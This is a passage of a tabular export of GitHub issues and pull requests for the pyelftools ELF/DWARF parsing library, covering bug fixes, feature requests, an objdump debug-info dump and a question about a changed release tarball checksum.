attribute form instead of 'data4' or 'data8'.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/214/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/214/comments,https://api.github.com/repos/eliben/pyelftools/issues/214/events,https://github.com/eliben/pyelftools/pull/214,https://api.github.com/repos/eliben/pyelftools/pulls/214
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/213,398259607,MDU6SXNzdWUzOTgyNTk2MDc=,213,Publish the source of sample_exe64.elf,17551419,closed,FALSE,NA,NA,1,2019-01-11T11:58:09Z,2019-01-11T13:29:44Z,2019-01-11T13:29:44Z,NONE,NA,"Hi,

First of all, thanks for your awesome work!

I think it would be interesting to publish the source of the file [sample_exe64.elf](https://github.com/eliben/pyelftools/commits/master/examples/sample_exe64.elf) in order to be able to compile it with different compilers and different DWARF versions.
I'm currently extending the tests [dwarf_location_list](https://github.com/eliben/pyelftools/blob/master/examples/dwarf_location_lists.py) and [dwarf_range_list](https://github.com/eliben/pyelftools/blob/master/examples/dwarf_range_lists.py) to add support to DWARF4 and in order to add the tests, it would be awesome to have a sample file with each version !
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/213/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/213/comments,https://api.github.com/repos/eliben/pyelftools/issues/213/events,https://github.com/eliben/pyelftools/issues/213,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/212,393705613,MDExOlB1bGxSZXF1ZXN0MjQwNjU1MTI5,212,More efficient AbbrevDecl handling,955258,closed,FALSE,NA,NA,2,2018-12-22T21:55:38Z,2018-12-24T16:56:53Z,2018-12-24T16:56:53Z,CONTRIBUTOR,NA,"Create all the AbbrevDecl objects during parsing and later return
references to them - this gives a small performance gain.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/212/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/212/comments,https://api.github.com/repos/eliben/pyelftools/issues/212/events,https://github.com/eliben/pyelftools/pull/212,https://api.github.com/repos/eliben/pyelftools/pulls/212
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/211,391498676,MDExOlB1bGxSZXF1ZXN0MjM4OTg2MTcw,211,Bugfix: Reset prevstate if line program sequence ends,44033253,closed,FALSE,NA,NA,0,2018-12-16T19:46:25Z,2018-12-18T13:46:06Z,2018-12-18T13:46:06Z,CONTRIBUTOR,NA,There is a bug in dwarf_decode_address.py example - the prevstate needs to be reset to None when the line program sequence ends. This shows up in ELF files with multiple CUs.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/211/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/211/comments,https://api.github.com/repos/eliben/pyelftools/issues/211/events,https://github.com/eliben/pyelftools/pull/211,https://api.github.com/repos/eliben/pyelftools/pulls/211
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/210,391487750,MDExOlB1bGxSZXF1ZXN0MjM4OTc5MTI3,210,Bugfix: dwarf_decode_address.py [ Need to reset prevstate when the line number sequence ends],44033253,closed,FALSE,NA,NA,1,2018-12-16T17:27:13Z,2018-12-16T17:35:29Z,2018-12-16T17:35:29Z,CONTRIBUTOR,NA,"There is a minor bug in the dwarf_decode_address.py example. ""prevstate"" needs to be reset when the line number sequence ends. It doesn't show up with the sample file as it likely has only one compilation unit.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/210/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/210/comments,https://api.github.com/repos/eliben/pyelftools/issues/210/events,https://github.com/eliben/pyelftools/pull/210,https://api.github.com/repos/eliben/pyelftools/pulls/210
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/209,391410330,MDExOlB1bGxSZXF1ZXN0MjM4OTMxNDI5,209,Simplify handling of null DIEs,955258,closed,FALSE,NA,NA,2,2018-12-15T20:45:23Z,2018-12-20T13:21:35Z,2018-12-20T13:21:35Z,CONTRIBUTOR,NA,"The code that is intended to coalesce null DIEs into the DIE that
precedes them does not do that and is actually not needed as the
'unflattening' procedure takes care of any unexpected null DIEs.

As the behavior will be the same both with and without the code
that handles the null DIEs we can remove it.

Also added a unit test that verifies the DIE size calculation.

",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/209/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/209/comments,https://api.github.com/repos/eliben/pyelftools/issues/209/events,https://github.com/eliben/pyelftools/pull/209,https://api.github.com/repos/eliben/pyelftools/pulls/209
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/208,391407924,MDExOlB1bGxSZXF1ZXN0MjM4OTI5ODky,208,Added support for decoding .debug_pubtypes and .debug_pubnames sections,44033253,closed,FALSE,NA,NA,2,2018-12-15T20:09:30Z,2018-12-24T14:02:09Z,2018-12-24T14:02:09Z,CONTRIBUTOR,NA,"This pull request is meant to fix #201 . It adds support for parsing .debug_pubtypes and .debug_pubnames sections from an ELF file. 

There is an example file (examples/dwarf_pubnames_types.py) added that exercises the new features.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/208/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/208/comments,https://api.github.com/repos/eliben/pyelftools/issues/208/events,https://github.com/eliben/pyelftools/pull/208,https://api.github.com/repos/eliben/pyelftools/pulls/208
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/207,388258413,MDExOlB1bGxSZXF1ZXN0MjM2NTY1MDI0,207,Fix parsing issues in .ARM.attributes section,43141472,closed,FALSE,NA,NA,1,2018-12-06T15:15:12Z,2020-02-04T14:31:59Z,2020-02-04T14:31:58Z,NONE,NA,"* Fix seeking to the start of each subsection and subsubsection
* Fix concurrency issue when the position of the cursor in the stream
  is changed during the ""yield""",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/207/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/207/comments,https://api.github.com/repos/eliben/pyelftools/issues/207/events,https://github.com/eliben/pyelftools/pull/207,https://api.github.com/repos/eliben/pyelftools/pulls/207
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/206,383262657,MDExOlB1bGxSZXF1ZXN0MjMyNzc1Mzcy,206,Implemented ELFFile.get_machine_arch for the remaining architectures.,7347561,closed,FALSE,NA,NA,0,2018-11-21T19:25:21Z,2018-11-25T22:06:15Z,2018-11-25T22:06:15Z,CONTRIBUTOR,NA,Added all architectures according to the ENUM_E_MACHINE.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/206/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/206/comments,https://api.github.com/repos/eliben/pyelftools/issues/206/events,https://github.com/eliben/pyelftools/pull/206,https://api.github.com/repos/eliben/pyelftools/pulls/206
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/205,382869851,MDU6SXNzdWUzODI4Njk4NTE=,205,What's the vendor abbreviation do we use for vendor-specific functions and definitions?,34638941,closed,FALSE,NA,NA,0,2018-11-20T22:13:51Z,2018-11-20T22:16:27Z,2018-11-20T22:15:14Z,NONE,NA,Is there a way to register a particular vendor_id in a central location?,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/205/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/205/comments,https://api.github.com/repos/eliben/pyelftools/issues/205/events,https://github.com/eliben/pyelftools/issues/205,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/204,374558699,MDExOlB1bGxSZXF1ZXN0MjI2MjM0OTg5,204,Remove unnecessary 'preserve_stream_pos',955258,closed,FALSE,NA,NA,1,2018-10-26T21:48:49Z,2018-10-27T12:19:17Z,2018-10-27T12:19:17Z,CONTRIBUTOR,NA,"The stream position in the .debug_info stream can't change when
reading from the .debug_abbrev stream.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/204/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/204/comments,https://api.github.com/repos/eliben/pyelftools/issues/204/events,https://github.com/eliben/pyelftools/pull/204,https://api.github.com/repos/eliben/pyelftools/pulls/204
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/203,373358394,MDExOlB1bGxSZXF1ZXN0MjI1MzA1NjE1,203,"ARMAttribute: fix access to structs, stream and nul",6428272,closed,FALSE,NA,NA,2,2018-10-24T08:16:08Z,2018-10-25T12:31:21Z,2018-10-25T12:31:21Z,CONTRIBUTOR,NA,"The __init__ function of ARMAttribute has two parameters
structs and stream through which the caller can pass in the
relevant objects (ARMAttributesSubsubsection does that after
seeking to the right position in stream).

The accesses for TAG_SECTION and TAG_SYMBOL, however, were
referring to non-existing members instead of the parameters.

Additionally, one assertion tries to access an undefined
'null_byte' variable which should be 'nul' instead.

Unfortunately, I don't have an ARM system to generate a
testcase binary, but maybe somebody else can contribute that.

Fixes: #160 ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/203/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/203/comments,https://api.github.com/repos/eliben/pyelftools/issues/203/events,https://github.com/eliben/pyelftools/pull/203,https://api.github.com/repos/eliben/pyelftools/pulls/203
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/202,370963636,MDU6SXNzdWUzNzA5NjM2MzY=,202,dwarf_location_lists.py cannot read the location from binaries compiled by gcc5 ,12882216,open,FALSE,NA,NA,0,2018-10-17T08:48:52Z,2018-10-17T12:40:17Z,NA,NONE,NA,"I use the example code ""dwarf_location_lists.py"" to extract the location information from binaries with dwarf debug information generated by gcc5.
Bug it does not print the locations.

```
$ python dwarf_location_lists.py --test a
Processing file: a
  Found a compile unit at offset 0, length 193
```
I examined source code and found that the statement

`location_lists = dwarfinfo.location_lists()`

assigned a ""None"" to `location_lists`.

Further investigation showed that the function `location_lists` needed the "".debug_loc"" section and this "".debug_loc"" section is missing since gcc4.
This may indicate the ""debug_loc"" section is no longer needed and the pyelftools is out of date?


The debug information can be read by objdump:
```
$ objdump -e a
Contents of the .eh_frame section:

00000000 0000000000000014 00000000 CIE
  Version:               1
  Augmentation:          ""zR""
  Code alignment factor: 1
  Data alignment factor: -8
  Return address column: 16
  Augmentation data:     1b

  DW_CFA_def_cfa: r7 (rsp) ofs 8
  DW_CFA_offset: r16 (rip) at cfa-8
  DW_CFA_undefined: r16 (rip)

00000018 0000000000000014 0000001c FDE cie=00000000 pc=0000000000400430..000000000040045a
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop

00000030 0000000000000014 00000000 CIE
  Version:               1
  Augmentation:          ""zR""
  Code alignment factor: 1
  Data alignment factor: -8
  Return address column: 16
  Augmentation data:     1b

  DW_CFA_def_cfa: r7 (rsp) ofs 8
  DW_CFA_offset: r16 (rip) at cfa-8
  DW_CFA_nop
  DW_CFA_nop

00000048 0000000000000024 0000001c FDE cie=00000030 pc=00000000004003f0..0000000000400420
  DW_CFA_def_cfa_offset: 16
  DW_CFA_advance_loc: 6 to 00000000004003f6
  DW_CFA_def_cfa_offset: 24
  DW_CFA_advance_loc: 10 to 0000000000400400
  DW_CFA_def_cfa_expression (DW_OP_breg7 (rsp): 8; DW_OP_breg16 (rip): 0; DW_OP_lit15; DW_OP_and; DW_OP_lit11; DW_OP_ge; DW_OP_lit3; DW_OP_shl; DW_OP_plus)
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop

00000070 000000000000001c 00000044 FDE cie=00000030 pc=0000000000400526..000000000040056b
  DW_CFA_advance_loc: 1 to 0000000000400527
  DW_CFA_def_cfa_offset: 16
  DW_CFA_offset: r6 (rbp) at cfa-16
  DW_CFA_advance_loc: 3 to 000000000040052a
  DW_CFA_def_cfa_register: r6 (rbp)
  DW_CFA_advance_loc1: 64 to 000000000040056a
  DW_CFA_def_cfa: r7 (rsp) ofs 8
  DW_CFA_nop
  DW_CFA_nop

00000090 0000000000000044 00000064 FDE cie=00000030 pc=0000000000400570..00000000004005d5
  DW_CFA_advance_loc: 2 to 0000000000400572
  DW_CFA_def_cfa_offset: 16
  DW_CFA_offset: r15 (r15) at cfa-16
  DW_CFA_advance_loc: 2 to 0000000000400574
  DW_CFA_def_cfa_offset: 24
  DW_CFA_offset: r14 (r14) at cfa-24
  DW_CFA_advance_loc: 5 to 0000000000400579
  DW_CFA_def_cfa_offset: 32
  DW_CFA_offset: r13 (r13) at cfa-32
  DW_CFA_advance_loc: 2 to 000000000040057b
  DW_CFA_def_cfa_offset: 40
  DW_CFA_offset: r12 (r12) at cfa-40
  DW_CFA_advance_loc: 8 to 0000000000400583
  DW_CFA_def_cfa_offset: 48
  DW_CFA_offset: r6 (rbp) at cfa-48
  DW_CFA_advance_loc: 8 to 000000000040058b
  DW_CFA_def_cfa_offset: 56
  DW_CFA_offset: r3 (rbx) at cfa-56
  DW_CFA_advance_loc: 13 to 0000000000400598
  DW_CFA_def_cfa_offset: 64
  DW_CFA_advance_loc: 50 to 00000000004005ca
  DW_CFA_def_cfa_offset: 56
  DW_CFA_advance_loc: 1 to 00000000004005cb
  DW_CFA_def_cfa_offset: 48
  DW_CFA_advance_loc: 1 to 00000000004005cc
  DW_CFA_def_cfa_offset: 40
  DW_CFA_advance_loc: 2 to 00000000004005ce
  DW_CFA_def_cfa_offset: 32
  DW_CFA_advance_loc: 2 to 00000000004005d0
  DW_CFA_def_cfa_offset: 24
  DW_CFA_advance_loc: 2 to 00000000004005d2
  DW_CFA_def_cfa_offset: 16
  DW_CFA_advance_loc: 2 to 00000000004005d4
  DW_CFA_def_cfa_offset: 8
  DW_CFA_nop

000000d8 0000000000000014 000000ac FDE cie=00000030 pc=00000000004005e0..00000000004005e2
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop
  DW_CFA_nop

000000f0 ZERO terminator


.debug_aranges 节的内容:

  长度：                    44
  版本：                    2
  .debug_info 节中的偏移量:  0x0
  指针大小:                 8
  节区大小:                 0

    地址               长度
    0000000000400526 0000000000000045 
    0000000000000000 0000000000000000 

.debug_info 节的内容:

  编译单元 @ 偏移 0x0:
   长度：        0xc1 (32-bit)
   版本：        4
   缩写偏移量：    0x0
   指针大小：    8
 <0><b>：缩写编号：1 (DW_TAG_compile_unit)
    <c>   DW_AT_producer    : (间接字串，偏移量：0x3b)： GNU C11 5.4.0 20160609 -mtune=generic -march=x86-64 -g -fstack-protector-strong
    <10>   DW_AT_language    : 12	(ANSI C99)
    <11>   DW_AT_name        : a.c
    <15>   DW_AT_comp_dir    : (间接字串，偏移量：0x9e)： /home/newdisk/canicula/work/crfdis
    <19>   DW_AT_low_pc      : 0x400526
    <21>   DW_AT_high_pc     : 0x45
    <29>   DW_AT_stmt_list   : 0x0
 <1><2d>：缩写编号：2 (DW_TAG_base_type)
    <2e>   DW_AT_byte_size   : 8
    <2f>   DW_AT_encoding    : 7	(unsigned)
    <30>   DW_AT_name        : (间接字串，偏移量：0x29)： long unsigned int
 <1><34>：缩写编号：2 (DW_TAG_base_type)
    <35>   DW_AT_byte_size   : 1
    <36>   DW_AT_encoding    : 8	(unsigned char)
    <37>   DW_AT_name        : (间接字串，偏移量：0x0)： unsigned char
 <1><3b>：缩写编号：2 (DW_TAG_base_type)
    <3c>   DW_AT_byte_size   : 2
    <3d>   DW_AT_encoding    : 7	(unsigned)
    <3e>   DW_AT_name        : (间接字串，偏移量：0x8b)： short unsigned int
 <1><42>：缩写编号：2 (DW_TAG_base_type)
    <43>   DW_AT_byte_size   : 4
    <44>   DW_AT_encoding    : 7	(unsigned)
    <45>   DW_AT_name        : (间接字串，偏移量：0x2e)： unsigned int
 <1><49>：缩写编号：2 (DW_TAG_base_type)
    <4a>   DW_AT_byte_size   : 1
    <4b>   DW_AT_encoding    : 6	(signed char)
    <4c>   DW_AT_name        : (间接字串，偏移量：0x2)： signed char
 <1><50>：缩写编号：2 (DW_TAG_base_type)
    <51>   DW_AT_byte_size   : 2
    <52>   DW_AT_encoding    : 5	(signed)
    <53>   DW_AT_name        : (间接字串，偏移量：0xc1)： short int
 <1><57>：缩写编号：3 (DW_TAG_base_type)
    <58>   DW_AT_byte_size   : 4
    <59>   DW_AT_encoding    : 5	(signed)
    <5a>   DW_AT_name        : int
 <1><5e>：缩写编号：2 (DW_TAG_base_type)
    <5f>   DW_AT_byte_size   : 8
    <60>   DW_AT_encoding    : 5	(signed)
    <61>   DW_AT_name        : (间接字串，偏移量：0x20)： long int
 <1><65>：缩写编号：2 (DW_TAG_base_type)
    <66>   DW_AT_byte_size   : 8
    <67>   DW_AT_encoding    : 7	(unsigned)
    <68>   DW_AT_name        : (间接字串，偏移量：0xcb)： sizetype
 <1><6c>：缩写编号：2 (DW_TAG_base_type)
    <6d>   DW_AT_byte_size   : 1
    <6e>   DW_AT_encoding    : 6	(signed char)
    <6f>   DW_AT_name        : (间接字串，偏移量：0x9)： char
 <1><73>：缩写编号：4 (DW_TAG_subprogram)
    <74>   DW_AT_external    : 1
    <74>   DW_AT_name        : (间接字串，偏移量：0xe)： main
    <78>   DW_AT_decl_file   : 1
    <79>   DW_AT_decl_line   : 2
    <7a>   DW_AT_type        : <0x57>
    <7e>   DW_AT_low_pc      : 0x400526
    <86>   DW_AT_high_pc     : 0x45
    <8e>   DW_AT_frame_base  : 1 字节区块： 9c 	(DW_OP_call_frame_cfa)
    <90>   DW_AT_GNU_all_tail_call_sites: 1
 <2><90>：缩写编号：5 (DW_TAG_variable)
    <91>   DW_AT_name        : i
    <93>   DW_AT_decl_file   : 1
    <94>   DW_AT_decl_line   : 4
    <95>   DW_AT_type        : <0x57>
    <99>   DW_AT_location    : 2 字节区块： 91 64 	(DW_OP_fbreg: -28)
 <2><9c>：缩写编号：5 (DW_TAG_variable)
    <9d>   DW_AT_name        : j
    <9f>   DW_AT_decl_file   : 1
    <a0>   DW_AT_decl_line   : 5
    <a1>   DW_AT_type        : <0x57>
    <a5>   DW_AT_location    : 2 字节区块： 91 68 	(DW_OP_fbreg: -24)
 <2><a8>：缩写编号：5 (DW_TAG_variable)
    <a9>   DW_AT_name        : a
    <ab>   DW_AT_decl_file   : 1
    <ac>   DW_AT_decl_line   : 8
    <ad>   DW_AT_type        : <0x57>
    <b1>   DW_AT_location    : 2 字节区块： 91 6c 	(DW_OP_fbreg: -20)
 <2><b4>：缩写编号：6 (DW_TAG_label)
    <b5>   DW_AT_name        : (间接字串，偏移量：0x13)： return_label
    <b9>   DW_AT_decl_file   : 1
    <ba>   DW_AT_decl_line   : 10
    <bb>   DW_AT_low_pc      : 0x400564
 <2><c3>：缩写编号：0
 <1><c4>：缩写编号：0

.debug_abbrev 节的内容:

  Number TAG (0x0)
   1      DW_TAG_compile_unit    [has children]
    DW_AT_producer     DW_FORM_strp
    DW_AT_language     DW_FORM_data1
    DW_AT_name         DW_FORM_string
    DW_AT_comp_dir     DW_FORM_strp
    DW_AT_low_pc       DW_FORM_addr
    DW_AT_high_pc      DW_FORM_data8
    DW_AT_stmt_list    DW_FORM_sec_offset
    DW_AT value: 0     DW_FORM value: 0
   2      DW_TAG_base_type    [no children]
    DW_AT_byte_size    DW_FORM_data1
    DW_AT_encoding     DW_FORM_data1
    DW_AT_name         DW_FORM_strp
    DW_AT value: 0     DW_FORM value: 0
   3      DW_TAG_base_type    [no children]
    DW_AT_byte_size    DW_FORM_data1
    DW_AT_encoding     DW_FORM_data1
    DW_AT_name         DW_FORM_string
    DW_AT value: 0     DW_FORM value: 0
   4      DW_TAG_subprogram    [has children]
    DW_AT_external     DW_FORM_flag_present
    DW_AT_name         DW_FORM_strp
    DW_AT_decl_file    DW_FORM_data1
    DW_AT_decl_line    DW_FORM_data1
    DW_AT_type         DW_FORM_ref4
    DW_AT_low_pc       DW_FORM_addr
    DW_AT_high_pc      DW_FORM_data8
    DW_AT_frame_base   DW_FORM_exprloc
    DW_AT_GNU_all_tail_call_sites DW_FORM_flag_present
    DW_AT value: 0     DW_FORM value: 0
   5      DW_TAG_variable    [no children]
    DW_AT_name         DW_FORM_string
    DW_AT_decl_file    DW_FORM_data1
    DW_AT_decl_line    DW_FORM_data1
    DW_AT_type         DW_FORM_ref4
    DW_AT_location     DW_FORM_exprloc
    DW_AT value: 0     DW_FORM value: 0
   6      DW_TAG_label    [no children]
    DW_AT_name         DW_FORM_strp
    DW_AT_decl_file    DW_FORM_data1
    DW_AT_decl_line    DW_FORM_data1
    DW_AT_low_pc       DW_FORM_addr
    DW_AT value: 0     DW_FORM value: 0

.debug_line 节的调试内容转储：

  偏移：                       0x0
  长度：                      57
  DWARF 版本：                2
  导言长度：        26
  最小指令长度：              1
  “is_stmt”的初始值：       1
  行基数：                      -5
  行范围：                      14
  操作码基数：                  13

 操作码:
  操作码 1 具有 0 个参数
  操作码 2 具有 1 个参数
  操作码 3 具有 1 个参数
  操作码 4 具有 1 个参数
  操作码 5 具有 1 个参数
  操作码 6 具有 0 个参数
  操作码 7 具有 0 个参数
  操作码 8 具有 0 个参数
  操作码 9 具有 1 个参数
  操作码 10 具有 0 个参数
  操作码 11 具有 0 个参数
  操作码 12 具有 1 个参数

 目录表为空。

 文件名表 (偏移 0x1c):
  条目	目录	时间	大小	名称
  1	0	0	0	a.c

 行号语句：
  [0x00000024]  扩充操作码 2： 设置地址为 0x400526
  [0x0000002f]  Special opcode 7: advance Address by 0 to 0x400526 and Line by 2 to 3
  [0x00000030]  Special opcode 118: advance Address by 8 to 0x40052e and Line by 1 to 4
  [0x00000031]  Special opcode 104: advance Address by 7 to 0x400535 and Line by 1 to 5
  [0x00000032]  Special opcode 104: advance Address by 7 to 0x40053c and Line by 1 to 6
  [0x00000033]  Special opcode 91: advance Address by 6 to 0x400542 and Line by 2 to 8
  [0x00000034]  Special opcode 104: advance Address by 7 to 0x400549 and Line by 1 to 9
  [0x00000035]  Advance PC by constant 17 to 0x40055a
  [0x00000036]  Special opcode 147: advance Address by 10 to 0x400564 and Line by 2 to 11
  [0x00000037]  Special opcode 76: advance Address by 5 to 0x400569 and Line by 1 to 12
  [0x00000038]  Advance PC by 2 to 0x40056b
  [0x0000003a]  扩充操作码 1： 序列结束


.debug_str 节的内容:

  0x00000000 756e7369 676e6564 20636861 72006d61 unsigned char.ma
  0x00000010 696e0072 65747572 6e5f6c61 62656c00 in.return_label.
  0x00000020 6c6f6e67 20696e74 006c6f6e 6720756e long int.long un
  0x00000030 7369676e 65642069 6e740047 4e552043 signed int.GNU C
  0x00000040 31312035 2e342e30 20323031 36303630 11 5.4.0 2016060
  0x00000050 39202d6d 74756e65 3d67656e 65726963 9 -mtune=generic
  0x00000060 202d6d61 7263683d 7838362d 3634202d  -march=x86-64 -
  0x00000070 67202d66 73746163 6b2d7072 6f746563 g -fstack-protec
  0x00000080 746f722d 7374726f 6e670073 686f7274 tor-strong.short
  0x00000090 20756e73 69676e65 6420696e 74002f68  unsigned int./h
  0x000000a0 6f6d652f 6e657764 69736b2f 63616e69 ome/newdisk/cani
  0x000000b0 63756c61 2f776f72 6b2f6372 66646973 cula/work/crfdis
  0x000000c0 0073686f 72742069 6e740073 697a6574 .short int.sizet
  0x000000d0 79706500                            ype.

```",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/202/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/202/comments,https://api.github.com/repos/eliben/pyelftools/issues/202/events,https://github.com/eliben/pyelftools/issues/202,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/201,368761286,MDU6SXNzdWUzNjg3NjEyODY=,201,Support for .debug_pubtypes and .debug_pubnames?,44033253,closed,FALSE,NA,NA,2,2018-10-10T16:59:53Z,2018-12-24T14:02:09Z,2018-12-24T14:02:09Z,CONTRIBUTOR,NA,"Hi, 

First of all, this is an incredibly useful tool that I've used to augment and automate many debug tasks. Thanks a lot for developing what I know of as the only Python-only framework for DWARF parsing. 

The one problem that I frequently face is the need to parse the entire ELF on start-up in order to generate indexing information for faster look-up based on three criteria - variable or function name, a type name (struct/enum etc.,), and address. I used to do this by manually walking the entire ELF and storing CU/DIE offsets as a function of names and addresses and types. This is quite time consuming especially when it comes to recursively parsing all the possible type definitions defined in the ELF.

I just recently learned that the DWARF format provides support for .debug_aranges, .debug_pubnames and .debug_pubtypes that pretty eliminates the need for the indexing that I am doing (as they already are the indexes that I need). Unfortunately, while .debug_aranges is supported, the other two (pubnames and pubtypes) aren't yet supported in pyelftools. 

I am wondering if there is a plan to add support for .debug_pubtypes and .debug_pubnames in the near future. If not, there is any other alternative to indexing the entire ELF for faster lookup?

Thanks,
Vijay.
 ",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/201/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/201/comments,https://api.github.com/repos/eliben/pyelftools/issues/201/events,https://github.com/eliben/pyelftools/issues/201,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/200,366055615,MDExOlB1bGxSZXF1ZXN0MjE5ODI2MDA1,200,Provide enums for DT_FLAGS and DT_FLAGS_1,6428272,closed,FALSE,NA,NA,2,2018-10-02T19:57:11Z,2018-10-04T12:15:50Z,2018-10-04T12:15:50Z,CONTRIBUTOR,NA,"This change adds two enums with the name to value mappings
for the two flags fields in the dynamic section. The values
and corresponding names are taken from the elf/elf.h file
in the most recent glibc version.

The enums are also used to print the names instead of the
raw hex values for DT_FLAGS and DT_FLAGS_1 in
scripts/readelf.py.

Fixes: #189",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/200/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/200/comments,https://api.github.com/repos/eliben/pyelftools/issues/200/events,https://github.com/eliben/pyelftools/pull/200,https://api.github.com/repos/eliben/pyelftools/pulls/200
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/199,362789996,MDU6SXNzdWUzNjI3ODk5OTY=,199,The v0.24 Release Tarball has Changed,40771426,closed,FALSE,NA,NA,1,2018-09-21T22:11:11Z,2018-09-27T12:06:07Z,2018-09-27T12:06:07Z,NONE,NA,"I recently noticed that the [v0.24 release](https://github.com/eliben/pyelftools/releases/tag/v0.24)'s tarball has changed size and checksum.

The v0.24.tar.gz file used to have the following properties:
```
size: 411874
sha512sum: 5169617f9a8446ffc21dfc44ee185a388c8945a0296bdc6752483b0756888dccb10e3ee88e529d101cf31a4595de924b5c95f5459d5ee4448f57c0c4f2c56887
```

The file now has these properties:
```
size: 600985
sha512sum: 5f02018b3c1c6da55c762e4e7a0eb9d5c9d2af542779dbcda231f563eb93565a0b5bd520ab5a4e07b26958122abeea1e76ee8609e4941ac38289adacea50910f
```

The old properties are corroborated by [the Gentoo package manifest](https://gitweb.gentoo.org/repo/gentoo.git/tree/dev-python/pyelftools/Manifest) and by downloading the mirror of the release [from PyPI](https://pypi.org/project/pyelftools/0.24/#files).

I'm filing an issue because this is rather strange and I wanted to find out if the pyelftools maintainers happen to know what might have happened here.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/199/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/199/comments,https://api.github.com/repos/eliben/pyelftools/issues/199/events,https://github.com/eliben/pyelftools/issues/199,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/198,361477235,MDU6SXNzdWUzNjE0NzcyMzU=,198,"Unable to find DynamicSection (.dynamic) for certain binaries (e.g. ""fsf-merkle.so"")",38704714,closed,FALSE,NA,NA,0,2018-09-18T20:46:59Z,2018-09-18T20:53:53Z,2018-09-18T20:53:53Z,NONE,NA,nevermind,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/198/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/198/comments,https://api.github.com/repos/eliben/pyelftools/issues/198/events,https://github.com/eliben/pyelftools/issues/198,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/197,360840153,MDU6SXNzdWUzNjA4NDAxNTM=,197,Elf Dwarf inconsistency in thumb mode,5237891,closed,FALSE,NA,NA,3,2018-09-17T12:13:35Z,2019-07-23T15:20:24Z,2019-07-23T15:18:23Z,NONE,NA,"I faced with some kind of inconsistency between elf and dwarf representation in the library. The following code is compiled with `arm-none-eabi-gcc main.c -mthumb -nostdlib -g`:
```c
int main(int argc, char *argv[]) { 
    return argc;                   
}                                  
```
Then I have the following script:
```python
#!/usr/bin/env python3

import sys 
from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

with open(sys.argv[1], 'rb') as f:                                                                                                                                                                                                                                              
    elffile = ELFFile(f)
    dwarfinfo = elffile.get_dwarf_info()

    for cu in dwarfinfo.iter_CUs():
        for die in cu.iter_DIEs():
            print(die)

    symbol_tables = [s for s in elffile.iter_sections()
            if isinstance(s, SymbolTableSection)]

    for section in symbol_tables:
        for symbol in section.iter_symbols():
            print(symbol.name, symbol['st_value'])
```
And the partial output is:
```
DIE DW_TAG_subprogram, size=26, has_chidren=True
    |DW_AT_external    :  AttributeValue(name='DW_AT_external', form='DW_FORM_flag_present', value=b'', raw_value=b'', offset=38)
